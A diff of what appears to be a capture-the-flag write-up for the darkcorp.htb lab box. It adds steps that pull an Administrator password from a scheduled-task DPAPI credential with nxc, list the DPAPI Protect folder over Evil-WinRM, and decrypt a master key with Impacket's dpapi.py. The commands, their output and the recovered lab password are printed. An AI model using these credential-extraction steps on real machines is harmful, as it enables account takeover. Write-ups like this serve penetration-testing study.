@@ -1086,7 +1086,7 @@ SMB         web-01.darkcorp.htb 445    WEB-01           [+] Got 6 decrypted mast
 SMB         web-01.darkcorp.htb 445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
 ```
 
-The nxc module extracted a password, however having never us
+The nxc module extracted a password, however having never used this functionality in nxc im going to check it manually as well
 
 ```python
 *Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> dir -force
@@ -1119,7 +1119,32 @@ Mode                 LastWriteTime         Length Name
 
 And also a credential
 
+Ill download all of them
 
+```python
+dpapi.py masterkey -file 6037d071-cac5-481e-9e08-c4296c0a7ff7 -sid S-1-5-21-2988385993-1727309239-2541228647-500
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 6037d071-cac5-481e-9e08-c4296c0a7ff7
+Flags       :        5 (5)
+Policy      :        0 (0)
+MasterKeyLen: 000000b0 (176)
+BackupKeyLen: 00000090 (144)
+CredHistLen : 00000014 (20)
+DomainKeyLen: 00000000 (0)
+
+Password:
+Decrypted key with User Key (SHA1)
+Decrypted key: 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da
+```
+
+Using the password nxc found `But_Lying_Aid9!` i am able to decrpyt the key
+
+```python
+
+```
 
 
 
